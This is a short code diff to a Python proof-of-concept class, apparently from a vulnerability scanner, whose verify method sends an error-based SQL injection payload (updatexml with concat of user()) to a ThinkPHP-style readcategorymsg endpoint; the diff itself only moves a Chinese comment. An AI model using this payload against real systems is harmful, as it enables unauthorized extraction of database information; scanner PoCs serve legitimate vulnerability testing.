@@ -28,9 +28,10 @@ class Poc(ABPoc):
 
     def verify(self):
         try:
-            #需要制定参数，默认http://你的 IP 地址:端口号/Home/Index/readcategorymsg地址
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
-                target=self.target, vuln=self.vuln))      
+                target=self.target, vuln=self.vuln))
+
+            #需要制定参数，默认http://你的 IP 地址:端口号/Home/Index/readcategorymsg地址     
             payload = {'category[0]':'bind','category[1]':'0 and (updatexml(1,concat(0x7e,(user())),0))'}
             request = requests.get('{target}'.format(target=self.target), params=payload)
             r = request.text
